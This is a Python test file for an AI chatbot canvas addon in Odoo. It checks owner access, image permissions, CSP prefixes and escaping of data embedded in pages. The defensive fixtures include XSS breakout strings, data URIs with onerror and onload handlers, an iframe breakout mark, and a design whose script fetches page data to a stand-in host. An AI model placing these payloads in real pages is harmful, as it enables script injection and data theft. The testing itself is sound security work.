# SPDX-License-Identifier: Apache-2.0
# Copyright (C) 2026 Seges
# Seges: parches 25 a 29 (tests de la entrega E3′) y 34 (E4′.b). Ver docs/pendiente/parches_pns_ai.md
# Seges: fase 2b sobre 3.1.973, solo los casos de los parches 25, 26 y 28 (los de 27, 29 y 34 vuelven en la fase 4). Ver docs/pendiente/parches_pns_ai.md
# Seges: fase 4 sobre 3.1.973, vuelven los casos del parche 27 y P-9 parte A (los de 29 y 34, en su parche). Ver docs/pendiente/parches_pns_ai.md
"""Entrega E3′, el lienzo (docs/pendiente/e3_propuesta_3879.md, «Propuesta final»).

En la rama 14.0-pns-ai-3973 (fase 2b) solo están los casos de:

- Parche 25 (M1): ``_paint_canvas`` comprueba el dueño (3.1.973 ya lo hizo privado).
- Parche 26 (M2): ``page_html`` y ``open_page`` leen las imágenes sin ``su``.
- Parche 27 (F1), fase 4: JSON seguro dentro de ``<script>``, imágenes ``data:`` solo en
  base64, CSP en ``<meta>`` al servir (diseño y descargas) y regla de diseño sin recursos
  externos; la cabecera CSP del fabricante no cambia (P-9 parte A).
- Parche 28 (D1): ``user_ids`` solo internos y el AI Administrator solo lee y borra
  páginas ajenas. ``owner_id`` y el alta fuera de ``su`` los cierra ya el fabricante
  (``_SYSTEM_FIELDS`` y ``create``): esos casos quedan como no regresión.

Base ``HttpCase`` (``SegesChatbooCase``): los cursores propios de ``_store_design``
comparten la transacción del test. El driver de diseño está sustituido: sin red.
"""

import base64
import html
import io
import json
import re
from unittest import mock

from PIL import Image

from odoo.exceptions import AccessError, ValidationError
from odoo.tests import tagged
from odoo.tests.common import new_test_user
from odoo.tools import mute_logger

from odoo.addons.pns_ai_chatboo.models import chatboo_canvas as canvas
from odoo.addons.pns_ai_mcp.utils.sandbox_helpers import collect_sandbox_helpers

from .common import SegesChatbooCase

LLM = 'odoo.addons.pns_ai_mcp.utils.agent_engine.llm_completion_for_agent'
# Seges: parche 27 (F1, seguridad). Ver docs/pendiente/parches_pns_ai.md
EVIL = '</script><script>alert("seges-e3")</script>'
EVIL_COMMENT = '<!--<script>'
BREAKOUTS = ('</script><script>alert', '<!--<script')
# Cabecera CSP del fabricante (pns_ai_chatboo/controllers/chatboo.py, _PAGE_CSP): no cambia (decisión 6).
PAGE_CSP = (
    "default-src 'none'; script-src 'unsafe-inline'; "
    "style-src 'unsafe-inline'; img-src 'self' data: blob:; "
    "font-src data:; connect-src 'self'; form-action 'none'; "
    "base-uri 'none'; frame-ancestors 'self'"
)
ROW_NAME = 'Seges E3 fila'
DESIGN = (
    '<!DOCTYPE html><html><head><title>Seges E3</title></head><body>'
    '<div id="out"></div>'
    '<script>const DATA = [{"name": "a", "photo": "b"}];'
    'document.getElementById("out").textContent = DATA.length;</script>'
    '</body></html>'
)


def _png_base64():
    buf = io.BytesIO()
    Image.new('RGB', (16, 16), (200, 30, 30)).save(buf, 'PNG')
    return base64.b64encode(buf.getvalue())


# Seges: parche 27 (F1, seguridad). Ver docs/pendiente/parches_pns_ai.md
def _json_after(text, marker):
    """El valor JSON que sigue a ``marker`` en ``text``."""
    start = text.index(marker) + len(marker)
    return json.JSONDecoder().raw_decode(text, start)[0]


# Casos de la revisión de E3′ (B1): el principio del documento no se analiza.
B1_DESIGNS = (
    '<!DOCTYPE html><!--><script>fetch("https://x/?" + JSON.stringify(DATA))</script>-->'
    '<html><head></head><body></body></html>',
    '<!DOCTYPE html><!---><script>1</script>--><html><head></head><body></body></html>',
    '<!DOCTYPE html><!-- a --!><script>1</script><html><head></head><body></body></html>',
    '\ufeff<!DOCTYPE html><html><head></head><body><script>1</script></body></html>',
    '\u00a0<!DOCTYPE html><html><head></head><body></body></html>',
    '<!DOCTYPE html>\x0b<html><head></head><body></body></html>',
    '<!DOCTYPE html><html-x><head-x><script>1</script></head-x><body></body></html>',
    '<html data-x=">"><head data-x=">"><script>1</script></head><body></body></html>',
    '<?xml version="1.0"?><!DOCTYPE html><html><head></head><body></body></html>',
    '<!DOCTYPE html><script>1</script><head></head><body></body>',
    '<HTML LANG="es"><HEAD><META HTTP-EQUIV="refresh" CONTENT="0"></HEAD><BODY></BODY></HTML>',
    '<html><body><script>1</script></body></html>',
    '<body><p>x</p></body>',
    '<p>sin body</p>',
)


def _assert_csp_served(case, served, design):
    """Lo servido empieza por el prefijo fijo y sigue el documento tal cual."""
    prefix = canvas._CSP_PREFIX
    case.assertTrue(served.startswith(prefix), served[:200])
    end = design.lower().rfind('</body>')
    kept = design[:end] if end >= 0 else design
    case.assertTrue(served[len(prefix):].startswith(kept), served[:300])


class _SegesCanvasCase(SegesChatbooCase):
    """Dos usuarios internos con su sesión y el driver de diseño simulado."""

    def setUp(self):
        super().setUp()
        self.user_a = new_test_user(
            self.env, login='seges_e3_a', groups='base.group_user',
            password='seges_e3_a',
        )
        self.user_b = new_test_user(
            self.env, login='seges_e3_b', groups='base.group_user',
            password='seges_e3_b',
        )
        Session = self.env['chatboo.session']
        self.session_a = Session.with_user(self.user_a).create({'name': 'Seges E3 a'})
        self.session_b = Session.with_user(self.user_b).create({'name': 'Seges E3 b'})
        self.design_calls = []

    def _driver(self, env, system, prompt, **kwargs):
        self.design_calls.append(prompt)
        return {'content': DESIGN, 'error': '', 'usage': {'total_tokens': 1}}

    def _fresh(self, session):
        session.invalidate_cache()
        return session.sudo()


@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesPaintCanvas(_SegesCanvasCase):
    """Parche 25 (M1)."""

    def setUp(self):
        super().setUp()
        self._chat_user('seges_e3_rpc')

    def test_rpc_public_name_gone(self):
        res = self._rpc(
            'seges_e3_rpc', 'chatboo.session', 'paint_canvas',
            [[self.session_b.id], 'Seges E3'],
        )
        self._assert_refused(res, private=False)

    def test_rpc_private_name_refused(self):
        res = self._rpc(
            'seges_e3_rpc', 'chatboo.session', '_paint_canvas',
            [[self.session_b.id], 'Seges E3'],
        )
        self._assert_refused(res, private=True)

    def test_foreign_session_refused(self):
        before = self._fresh(self.session_b)
        design, rev = before.canvas_design, before.canvas_rev
        with mock.patch(LLM, side_effect=self._driver):
            with self.assertRaisesRegex(AccessError, 'belongs to another user'):
                self.session_b.with_user(self.user_a)._paint_canvas(
                    'Seges E3', new_page=True,
                )
        after = self._fresh(self.session_b)
        self.assertEqual(after.canvas_design, design)
        self.assertEqual(after.canvas_rev, rev)
        self.assertFalse(self.design_calls)

    def test_own_session_paints(self):
        with mock.patch(LLM, side_effect=self._driver):
            url = self.session_a.with_user(self.user_a)._paint_canvas(
                'Seges E3', new_page=True,
            )
        session = self._fresh(self.session_a)
        self.assertEqual(url, f'/chatboo/canvas/{session.id}?rev=1')
        self.assertEqual(session.canvas_rev, 1)
        self.assertIn('document.getElementById("out")', session.canvas_design)


@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesCanvasPictures(_SegesCanvasCase):
    """Parche 26 (M2): imágenes con los permisos del usuario, también en sudo."""

    def setUp(self):
        super().setUp()
        other = self.env['res.company'].create({'name': 'Seges E3 otra'})
        png = _png_base64()
        Partner = self.env['res.partner']
        # Contacto de otra compañía, sin usuario: la regla multicompañía lo oculta.
        self.hidden = Partner.create({
            'name': 'Seges E3 oculto', 'company_id': other.id, 'image_1920': png,
        })
        self.visible = Partner.create({
            'name': 'Seges E3 visible', 'company_id': False, 'image_1920': png,
        })
        self.env['base'].flush()
        self.helpers = collect_sandbox_helpers(self.env(
            user=self.user_a.id, context={'ai_session_ref': self.session_a.id},
        ))

    def _rows(self, partner):
        return [{
            'name': ROW_NAME,
            'photo': f'/web/image/res.partner/{partner.id}/image_128',
        }]

    def _page_html(self, partner):
        url = self.helpers['page_html'](DESIGN, rows=self._rows(partner))
        self.assertTrue(url)
        return self._fresh(self.session_a).canvas_design

    def _page_url(self, partner):
        with mock.patch(LLM, side_effect=self._driver):
            url = self.helpers['page_url'](self._rows(partner), 'Seges E3')
        self.assertTrue(url)
        return self._fresh(self.session_a).canvas_design

    def test_user_cannot_read_hidden(self):
        partner = self.hidden.with_user(self.user_a)
        self.assertFalse(partner.search([('id', '=', self.hidden.id)]))

    def test_page_html_hidden_picture(self):
        self.assertNotIn('data:image', self._page_html(self.hidden))

    def test_page_url_hidden_picture(self):
        self.assertNotIn('data:image', self._page_url(self.hidden))

    def test_page_html_visible_picture(self):
        self.assertIn('data:image/png;base64,', self._page_html(self.visible))

    def test_page_url_visible_picture(self):
        self.assertIn('data:image/png;base64,', self._page_url(self.visible))


# Seges: parche 27 (F1, seguridad). Ver docs/pendiente/parches_pns_ai.md
@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesCanvasScriptJson(_SegesCanvasCase):
    """Parche 27 (F1), a: lo que entra en un <script> no lo cierra."""

    def _assert_safe(self, text, marker, value):
        for breakout in BREAKOUTS:
            self.assertNotIn(breakout, text)
        self.assertEqual(_json_after(text, marker), value)

    def _blocks(self):
        return [{'title': 'Seges', 'data': [
            {'name': EVIL, 'amount': 1}, {'name': EVIL_COMMENT, 'amount': 2},
            {'name': 'R&D   x > y', 'amount': 3},
        ]}]

    def test_const_data(self):
        blocks = self._blocks()
        out, n = canvas.bind_const_data(
            '<script>const DATA = [{"name": "a", "amount": 0}];</script>', blocks,
        )
        self.assertEqual(n, 1)
        self.assertNotIn(' ', out)
        self._assert_safe(out, 'const DATA = ', blocks[0]['data'])

    def test_const_data_blocks_shape(self):
        blocks = self._blocks()
        out, n = canvas.bind_const_data(
            '<script>const DATA = [{"title": "t", "data": []}];</script>', blocks,
        )
        self.assertEqual(n, 1)
        self._assert_safe(out, 'const DATA = ', blocks)

    def test_const_title(self):
        out, n = canvas.bind_const_title(
            '<script>const TITLE = "old";</script>', EVIL + EVIL_COMMENT,
        )
        self.assertEqual(n, 1)
        self._assert_safe(out, 'const TITLE = ', EVIL + EVIL_COMMENT)

    def test_other_arrays(self):
        blocks = self._blocks()
        out, n = canvas.bind_script_row_json(
            '<script>const ROWS = [{"name": "a", "amount": 0}];</script>', blocks,
        )
        self.assertEqual(n, 1)
        self._assert_safe(out, 'const ROWS = ', blocks[0]['data'])

    def test_rescue_page(self):
        blocks = self._blocks()
        out = canvas._page_for_rows(blocks)
        self._assert_safe(out, 'const DATA=', blocks[0]['data'])

    def test_rows_watch(self):
        marks = [[EVIL], [EVIL_COMMENT]]
        out = canvas._spare_rows_watch(marks)
        self._assert_safe(out, 'var ROWS=', marks)

    def test_whole_page(self):
        rows = self._blocks()
        out = canvas.place_rows_on_page(
            '<!DOCTYPE html><html><head><script>const TITLE = "t";</script></head>'
            '<body><script>const DATA = [{"name": "a", "amount": 0}];</script>'
            '</body></html>', rows, captured=True, title=EVIL,
        )
        for breakout in BREAKOUTS:
            self.assertNotIn(breakout, out)
        self.assertEqual(_json_after(out, 'const TITLE = '), EVIL)
        self.assertEqual(_json_after(out, 'const DATA = '), rows[0]['data'])

    def test_picture_only_base64_data_uri(self):
        png = 'data:image/png;base64,' + _png_base64().decode()
        self.assertEqual(canvas._picture_of(None, png), png)
        for value in ('data:image/png;base64,x</script><script>alert(1)//',
                      'data:image/png;base64,x" onerror="alert(1)',
                      'data:image/svg+xml,<svg onload=alert(1)>'):
            self.assertEqual(canvas._picture_of(None, value), '')


@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesCanvasShell(_SegesCanvasCase):
    """Parche 27 (F1), b y c: CSP al servir y regla de diseño.

    d (``X-Frame-Options``) no se porta a 3.1.973: la cabecera CSP del fabricante, con
    ``frame-ancestors 'self'``, sigue igual (decisión 6) y es lo que se comprueba.
    """

    def setUp(self):
        super().setUp()
        self.chat = self._chat_user('seges_e3_chat')
        # Guardado como antes del parche: sin <meta> de CSP.
        self.chat_session = self.env['chatboo.session'].with_user(self.chat).create({
            'name': 'Seges E3 carcasa',
        })
        self.chat_session.sudo().write({
            'canvas_open': True, 'canvas_design': DESIGN, 'canvas_rev': 1,
        })
        # Seges: adaptado a 3.1.973 (el alta es solo en su, como la ruta de compartir). Ver docs/pendiente/parches_pns_ai.md
        self.page = self.env['chatboo.canvas.page'].sudo().create({
            'name': 'Seges E3 compartida', 'design': DESIGN, 'owner_id': self.chat.id,
        })
        self.env['base'].flush()

    def _srcdoc(self, body):
        found = re.search(r'srcdoc="([^"]*)"', body)
        self.assertTrue(found, body[:300])
        return html.unescape(found.group(1))

    def test_stored_design_has_no_csp(self):
        self.assertNotIn('Content-Security-Policy', self.chat_session.sudo().canvas_design)
        self.assertNotIn('Content-Security-Policy', self.page.sudo().design)

    def test_canvas_shell(self):
        resp = self._get('seges_e3_chat', f'/chatboo/canvas/{self.chat_session.id}')
        self.assertEqual(resp.status_code, 200)
        # Seges: adaptado a 3.1.973 (sin X-Frame-Options: la CSP del fabricante no cambia). Ver docs/pendiente/parches_pns_ai.md
        self.assertEqual(resp.headers.get('Content-Security-Policy'), PAGE_CSP)
        _assert_csp_served(self, self._srcdoc(resp.text), DESIGN)

    def test_page_shell(self):
        resp = self._get('seges_e3_chat', f'/chatboo/page/{self.page.id}')
        self.assertEqual(resp.status_code, 200)
        # Seges: adaptado a 3.1.973 (sin X-Frame-Options: la CSP del fabricante no cambia). Ver docs/pendiente/parches_pns_ai.md
        self.assertEqual(resp.headers.get('Content-Security-Policy'), PAGE_CSP)
        _assert_csp_served(self, self._srcdoc(resp.text), DESIGN)

    def test_canvas_download(self):
        resp = self._get(
            'seges_e3_chat', f'/chatboo/canvas/{self.chat_session.id}/download',
        )
        self.assertEqual(resp.status_code, 200)
        # Seges: adaptado a 3.1.973 (la descarga no lleva cabecera CSP: su CSP es la <meta>). Ver docs/pendiente/parches_pns_ai.md
        self.assertIsNone(resp.headers.get('Content-Security-Policy'))
        _assert_csp_served(self, resp.text, DESIGN)

    def test_page_download(self):
        resp = self._get('seges_e3_chat', f'/chatboo/page/{self.page.id}/download')
        self.assertEqual(resp.status_code, 200)
        # Seges: adaptado a 3.1.973 (la descarga no lleva cabecera CSP: su CSP es la <meta>). Ver docs/pendiente/parches_pns_ai.md
        self.assertIsNone(resp.headers.get('Content-Security-Policy'))
        _assert_csp_served(self, resp.text, DESIGN)

    def test_csp_prefix_cases(self):
        for design in B1_DESIGNS:
            with self.subTest(design=design[:40]):
                _assert_csp_served(self, canvas.downloadable_page(design), design)
                _assert_csp_served(
                    self, self._srcdoc(canvas.canvas_page(design)), design,
                )

    def test_csp_policy(self):
        for directive in ("default-src 'none'", "connect-src 'none'",
                          'img-src data: blob:', "form-action 'none'",
                          "base-uri 'none'", "frame-src 'none'"):
            self.assertIn(directive, canvas._CSP_META)
        self.assertEqual(
            canvas._CSP_PREFIX,
            '<!DOCTYPE html><meta charset="utf-8">' + canvas._CSP_META,
        )

    def test_design_rule(self):
        rule = 'Do not load external libraries, fonts, stylesheets or images'
        for prompt in (canvas._PAGE_RULES, canvas.DESIGN_SYSTEM, canvas.EDIT_SYSTEM):
            self.assertIn(rule, prompt)
            self.assertIn('inline SVG or <canvas>', prompt)


@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesSharedPage(_SegesCanvasCase):
    """Parche 28 (D1)."""

    def setUp(self):
        super().setUp()
        self.admin = new_test_user(
            self.env, login='seges_e3_aiadmin',
            groups='base.group_user,pns_ai_mcp.group_ai_admin',
        )
        self.portal = new_test_user(
            self.env, login='seges_e3_portal', groups='base.group_portal',
        )
        # Seges: adaptado a 3.1.973 (el alta es solo en su, como la ruta de compartir). Ver docs/pendiente/parches_pns_ai.md
        Page = self.env['chatboo.canvas.page'].sudo()
        self.page = Page.create({
            'name': 'Seges E3 de a', 'design': DESIGN, 'owner_id': self.user_a.id,
        }).with_user(self.user_a)
        self.admin_page = Page.create({
            'name': 'Seges E3 del admin', 'design': DESIGN,
            'owner_id': self.admin.id,
        }).with_user(self.admin)

    def test_owner_cannot_change_owner(self):
        with self.assertRaises(AccessError):
            self.page.with_user(self.user_a).write({'owner_id': self.user_b.id})
        self.assertEqual(self.page.owner_id, self.user_a)

    def test_ai_admin_cannot_change_owner(self):
        with self.assertRaises(AccessError):
            self.admin_page.with_user(self.admin).write({'owner_id': self.user_b.id})
        with self.assertRaises(AccessError):
            self.page.with_user(self.admin).write({'owner_id': self.admin.id})
        self.assertEqual(self.page.owner_id, self.user_a)

    def test_sudo_changes_owner(self):
        self.page.with_user(self.user_a).sudo().write({'owner_id': self.user_b.id})
        self.assertEqual(self.page.owner_id, self.user_b)

    # Seges: adaptado a 3.1.973 (el fabricante rechaza owner_id fuera de su, aunque no cambie). Ver docs/pendiente/parches_pns_ai.md
    def test_same_owner_refused_too(self):
        with self.assertRaises(AccessError):
            self.page.with_user(self.user_a).write({
                'owner_id': self.user_a.id, 'name': 'Seges E3 renombrada',
            })
        self.assertEqual(self.page.name, 'Seges E3 de a')

    def test_portal_reader_refused(self):
        with mute_logger('odoo.models'), self.assertRaises(ValidationError):
            self.page.with_user(self.user_a).write({'user_ids': [(4, self.portal.id)]})
        # Seges: adaptado a 3.1.973 (el alta es solo en su, como la ruta de compartir). Ver docs/pendiente/parches_pns_ai.md
        with self.assertRaises(ValidationError):
            self.env['chatboo.canvas.page'].sudo().create({
                'design': DESIGN, 'owner_id': self.user_a.id,
                'user_ids': [(6, 0, [self.portal.id])],
            })
        with self.assertRaises(ValidationError):
            self.page.sudo().write({'user_ids': [(4, self.portal.id)]})

    def test_internal_reader_allowed(self):
        self.page.with_user(self.user_a).write({'user_ids': [(4, self.user_b.id)]})
        self.assertEqual(self.page.user_ids, self.user_b)

    def test_ai_admin_reads_and_deletes(self):
        page = self.page.with_user(self.admin)
        self.assertEqual(page.name, 'Seges E3 de a')
        page.unlink()
        self.assertFalse(self.page.exists())

    def test_ai_admin_cannot_write_foreign(self):
        page = self.page.with_user(self.admin)
        with self.assertRaises(AccessError):
            page.write({'name': 'Seges E3 cambiada'})
        with self.assertRaises(AccessError):
            page.action_unshare()
        self.assertEqual(self.page.name, 'Seges E3 de a')

    def test_ai_admin_cannot_create_for_other(self):
        with self.assertRaises(AccessError):
            self.env['chatboo.canvas.page'].with_user(self.admin).create({
                'design': DESIGN, 'owner_id': self.user_a.id,
            })


# Seges: parche 27 (F1, seguridad), P-9 parte A como test (fase 4 sobre 3.1.973). Ver docs/pendiente/parches_pns_ai.md
P9_MARK = '"></iframe><b id=p9>'
P9_DESIGN = (
    '<!DOCTYPE html><html><head><title>Seges P9</title></head><body><p>Seges P9</p>'
    + P9_MARK + 'marca</b></body></html>'
)


@tagged('post_install', '-at_install', 'pns_ai_chatboo', 'seges_e3p')
class TestSegesCanvasHeaders(_SegesCanvasCase):
    """P-9 parte A (comparación con 3.1.973, §9): cabeceras del fabricante, escape del
    ``srcdoc`` y descargas, en las cuatro rutas del lienzo."""

    def setUp(self):
        super().setUp()
        self.owner = self._chat_user('seges_p9_owner')
        self.reader = self._chat_user('seges_p9_reader')
        self.chat_session = self.env['chatboo.session'].with_user(self.owner).create({
            'name': 'Seges P9',
        })
        self.chat_session.sudo().write({
            'canvas_open': True, 'canvas_design': P9_DESIGN, 'canvas_rev': 1,
            'canvas_title': 'Seges P9',
        })
        self.page = self.env['chatboo.canvas.page'].sudo().create({
            'name': 'Seges P9 compartida', 'design': P9_DESIGN,
            'owner_id': self.owner.id, 'user_ids': [(6, 0, [self.reader.id])],
        })
        self.env['base'].flush()

    def _shells(self):
        return (
            ('canvas', 'seges_p9_owner', f'/chatboo/canvas/{self.chat_session.id}'),
            ('page', 'seges_p9_reader', f'/chatboo/page/{self.page.id}'),
        )

    def test_p9_shell_headers(self):
        for label, login, url in self._shells():
            with self.subTest(label):
                resp = self._get(login, url)
                self.assertEqual(resp.status_code, 200)
                self.assertEqual(resp.headers.get('Content-Security-Policy'), PAGE_CSP)
                self.assertEqual(resp.headers.get('X-Content-Type-Options'), 'nosniff')

    def test_p9_srcdoc_escape(self):
        for label, login, url in self._shells():
            with self.subTest(label):
                text = self._get(login, url).text
                self.assertEqual(text.count('<iframe'), 1)
                self.assertEqual(text.count('</iframe>'), 1)
                self.assertNotIn('<b id=p9>', text)
                self.assertIn('&lt;b id=p9&gt;', text)

    def test_p9_downloads(self):
        for label, login, url in (
            ('canvas', 'seges_p9_owner', f'/chatboo/canvas/{self.chat_session.id}/download'),
            ('page', 'seges_p9_reader', f'/chatboo/page/{self.page.id}/download'),
        ):
            with self.subTest(label):
                resp = self._get(login, url)
                self.assertEqual(resp.status_code, 200)
                self.assertIn('attachment', resp.headers.get('Content-Disposition') or '')
                self.assertEqual(resp.headers.get('X-Content-Type-Options'), 'nosniff')
                self.assertIsNone(resp.headers.get('Content-Security-Policy'))
                self.assertTrue(resp.text.startswith(canvas._CSP_PREFIX), resp.text[:200])
